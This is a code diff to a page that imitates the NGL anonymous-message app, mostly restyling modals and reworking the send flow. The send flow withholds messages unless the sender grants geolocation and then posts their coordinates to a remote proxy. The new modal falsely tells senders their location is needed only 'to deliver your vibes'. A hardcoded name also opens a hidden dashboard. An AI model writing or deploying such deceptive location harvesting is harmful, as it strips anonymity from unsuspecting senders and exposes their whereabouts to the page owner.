@@ -478,23 +478,25 @@
       text-align: center;
       position: relative;
     }
-    .ngl-modal-inner b {
-      color: #f43f5e;
+    .ngl-modal-inner b, .ngl-modal-inner .ngl-em {
+      color: #ff007a;
+      font-weight: 700;
     }
     .ngl-modal-btn {
       font-size: 1.08rem;
       font-weight: 600;
       padding: 10px 26px;
-      background: #f43f5e;
+      background: linear-gradient(90deg, #ff007a 0%, #f43f5e 70%, #f97316 100%);
       color: #fff;
       border-radius: 18px;
       border: none;
       cursor: pointer;
       margin-top: 18px;
       transition: background 0.18s;
+      box-shadow: 0 2px 8px #ff007a33;
     }
     .ngl-modal-btn:active {
-      background: #ff007a;
+      background: #f43f5e;
     }
     .ngl-modal-copy {
       display: block;
@@ -560,7 +562,8 @@
       <a href="#" id="quiz-link" style="color: inherit; text-decoration: none;">Do you want to know me even further?</a>
     </div>
   </div>
-  <!-- NGL loading spinner -->
+
+  <!-- Loading spinner -->
   <div id="nglLoading" class="ngl-loading-spinner" style="display:none;">
     <div class="ngl-spinner">
       <div class="ngl-spinner-inner">
@@ -572,6 +575,7 @@
       <div class="ngl-spinner-label">Sending...</div>
     </div>
   </div>
+
   <!-- Sent overlay -->
   <div id="sentOverlay">
     <div class="sent-circle">
@@ -602,17 +606,42 @@
       </div>
     </div>
   </div>
-  <!-- Location Modal (NGL-branded and playful) -->
+
+  <!-- NGL-style Pre-Permission Modal -->
+  <div id="nglAskLocationModal" class="ngl-modal-outer">
+    <div class="ngl-modal-inner">
+      <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#ff007a;">
+        🚦 Wait! Wait!
+      </div>
+      <div style="font-size:1.15rem; margin-bottom:14px;">
+        <span class="ngl-em" style="font-size:1.19rem;">Hold up, explorer!</span><br>
+        <span style="color:#f43f5e; font-weight:600;">
+          Please turn on your <span class="ngl-em">location</span> so your message can reach me!<br>
+        </span>
+        <span style="display:inline-block; margin-top:9px; font-size:1rem; color:#444;">
+          <b style="color:#ff007a;">No location, no message!</b><br>
+          We promise: we only use your location to deliver your vibes!
+        </span>
+      </div>
+      <button class="ngl-modal-btn" id="nglAskLocationAllowBtn">Okay, I'll allow it!</button>
+    </div>
+  </div>
+  <!-- NGL-style Denied Modal -->
   <div id="nglLocationModal" class="ngl-modal-outer">
     <div class="ngl-modal-inner">
-      <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#f43f5e;">
-        🗺️ Enable Location!
+      <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#ff007a;">
+        🗺️ Oops! Location Off
       </div>
       <div style="font-size:1.12rem; margin-bottom:14px;">
-        <span style="color:#f43f5e;"><b>We need your location</b></span> to send your message to the receiver.<br>
-        <span style="color:#f43f5e;">If you don't allow it, your message won't be sent at all.</span>
+        <span style="color:#f43f5e; font-weight:600;">
+          Must open <span class="ngl-em">location</span> in order to send the receiver your message.<br>
+          No location, no message!<br>
+        </span>
+        <span style="display:inline-block; margin-top:7px; font-size:1rem; color:#444;">
+          Try again and make sure to allow location access!
+        </span>
       </div>
-      <button class="ngl-modal-btn" id="nglLocationModalClose">Okay, I’ll allow!</button>
+      <button class="ngl-modal-btn" id="nglLocationModalClose">Okay, got it!</button>
     </div>
   </div>
   <!-- In-App Browser Not Supported Modal -->
@@ -632,8 +661,9 @@
       <button class="ngl-modal-copy" id="nglCopyLinkBtn">Copy Link</button>
     </div>
   </div>
+
   <script>
-    // --- In-app browser detection ---
+    // In-app browser detection
     function isInAppBrowser() {
       var ua = navigator.userAgent || navigator.vendor || '';
       return /FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSV|FBID|Messenger|Instagram/i.test(ua);
@@ -645,17 +675,6 @@
     function hideNglInAppModal() {
       document.getElementById('nglInAppModal').style.display = 'none';
       document.getElementById('fadeContainer').style.display = '';
-    }
-    // --- NGL-style Location Modal logic (with message clearing) ---
-    function showNglLocationModalAndResetMsg() {
-      document.getElementById('nglLocationModal').style.display = 'flex';
-      document.getElementById('nglLocationModalClose').onclick = function() {
-        document.getElementById('nglLocationModal').style.display = 'none';
-        document.getElementById('message').value = '';
-        document.getElementById('sentOverlay').style.display = 'none';
-        document.getElementById('fadeContainer').classList.remove('fade-out');
-        document.getElementById('message').focus();
-      };
     }
     document.getElementById('nglCopyLinkBtn').onclick = function() {
       navigator.clipboard.writeText(window.location.href).then(function() {
@@ -670,7 +689,8 @@
         showNglInAppModal();
       }
     });
-    // --- Dice phrases ---
+
+    // Dice logic
     const phrases = [
       "I like u, do u like me too?",
       "I'm still not over u",
@@ -686,7 +706,6 @@
     function isBypassName(name) {
       return name === "TEST0004" || name === "Jebmama3";
     }
-    // --- DICE BUTTON LOGIC ---
     const diceButton = document.getElementById('dice');
     const messageField = document.getElementById('message');
     const diceSound = new Audio('https://raw.githubusercontent.com/myngl-jeric/my-ngl-jeric-site/main/dice.mp3');
@@ -710,7 +729,8 @@
         diceRolling = false;
       }, 550);
     });
-    // --- Message DAILY LIMIT LOGIC ---
+
+    // Message daily limit logic
     const DAILY_LIMIT = 3;
     const MSG_STORE_KEY = 'ngl_msg_count';
     const MSG_DATE_KEY = 'ngl_msg_date';
@@ -766,6 +786,7 @@
     document.addEventListener('DOMContentLoaded', () => {
       updateMessagesLeftUI(document.getElementById('name').value.trim());
     });
+
     function showSentOverlay(name) {
       tuturuSound.currentTime = 0;
       tuturuSound.play();
@@ -804,10 +825,28 @@
       document.getElementById('sentPeopleTapCount').textContent =
         document.getElementById('peopleTapCount').textContent;
     }
-    // ---- FIXED LOCATION: Get lat/lng and send to backend! ----
+
+    // NGL-style modals logic
+    function showNglLocationModalAndResetMsg() {
+      document.getElementById('nglLocationModal').style.display = 'flex';
+      document.getElementById('nglLocationModalClose').onclick = function() {
+        document.getElementById('nglLocationModal').style.display = 'none';
+        document.getElementById('message').value = '';
+        document.getElementById('sentOverlay').style.display = 'none';
+        document.getElementById('fadeContainer').classList.remove('fade-out');
+        document.getElementById('message').focus();
+      };
+    }
+    function showNglAskLocationModal(onAllow) {
+      document.getElementById('nglAskLocationModal').style.display = 'flex';
+      document.getElementById('nglAskLocationAllowBtn').onclick = function() {
+        document.getElementById('nglAskLocationModal').style.display = 'none';
+        onAllow();
+      };
+    }
+
     async function dualSubmit(event) {
       event.preventDefault();
-      // Block in-app browsers
       if (isInAppBrowser()) {
         showNglInAppModal();
         return false;
@@ -817,6 +856,7 @@
       const form = event.target;
       const formData = new FormData(form);
       const nameValue = formData.get('name').trim();
+
       if (nameValue === "Jebmama3") {
         window.location.href = "dashboard.html";
         return false;
@@ -832,64 +872,65 @@
         return false;
       }
       window._lastSubmittedName = nameValue;
-      // --- LOCATION ENFORCEMENT BLOCK ---
-      let latitude = null, longitude = null;
-      if (navigator.geolocation) {
-        let locationAllowed = false;
-        await new Promise((resolve) => {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              locationAllowed = true;
-              latitude = pos.coords.latitude;
-              longitude = pos.coords.longitude;
-              resolve();
-            },
-            (err) => { locationAllowed = false; resolve(); }
-          );
-        });
-        if (!locationAllowed) {
+      showNglAskLocationModal(async function() {
+        let latitude = null, longitude = null;
+        if (navigator.geolocation) {
+          let locationAllowed = false;
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              (pos) => {
+                locationAllowed = true;
+                latitude = pos.coords.latitude;
+                longitude = pos.coords.longitude;
+                resolve();
+              },
+              (err) => { locationAllowed = false; resolve(); }
+            );
+          });
+          if (!locationAllowed) {
+            showNglLocationModalAndResetMsg();
+            return false;
+          }
+        } else {
           showNglLocationModalAndResetMsg();
           return false;
         }
-      } else {
-        showNglLocationModalAndResetMsg();
-        return false;
-      }
-      container.classList.add('fade-out');
-      loadingSpinner.style.display = "flex";
-      setTimeout(async () => {
-        try {
-          const response = await fetch('https://my-ngl-jeric-site.vercel.app/api/proxy', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-              name: formData.get('name'),
-              message: formData.get('message'),
-              latitude: latitude,
-              longitude: longitude
-            })
-          });
-          loadingSpinner.style.display = "none";
-          if (response.ok) {
-            if (!isBypassName(nameValue)) {
-              let left = getMessagesLeft(nameValue);
-              setMessagesLeft(left - 1);
+        container.classList.add('fade-out');
+        loadingSpinner.style.display = "flex";
+        setTimeout(async () => {
+          try {
+            const response = await fetch('https://my-ngl-jeric-site.vercel.app/api/proxy', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                name: formData.get('name'),
+                message: formData.get('message'),
+                latitude: latitude,
+                longitude: longitude
+              })
+            });
+            loadingSpinner.style.display = "none";
+            if (response.ok) {
+              if (!isBypassName(nameValue)) {
+                let left = getMessagesLeft(nameValue);
+                setMessagesLeft(left - 1);
+              }
+              updateMessagesLeftUI(nameValue);
+              const currentName = form.name.value;
+              form.reset();
+              form.name.value = currentName;
+              showSentOverlay(currentName);
+            } else {
+              alert('Failed to send. Please try again.');
+              container.classList.remove('fade-out');
             }
-            updateMessagesLeftUI(nameValue);
-            const currentName = form.name.value;
-            form.reset();
-            form.name.value = currentName;
-            showSentOverlay(currentName);
-          } else {
-            alert('Failed to send. Please try again.');
+          } catch (err) {
+            loadingSpinner.style.display = "none";
+            alert('There was an error. Please try again.');
             container.classList.remove('fade-out');
           }
-        } catch (err) {
-          loadingSpinner.style.display = "none";
-          alert('There was an error. Please try again.');
-          container.classList.remove('fade-out');
-        }
-      }, 800);
+        }, 800);
+      });
       return false;
     }
     document.getElementById('sendAnotherLink').addEventListener('click', function(e) {
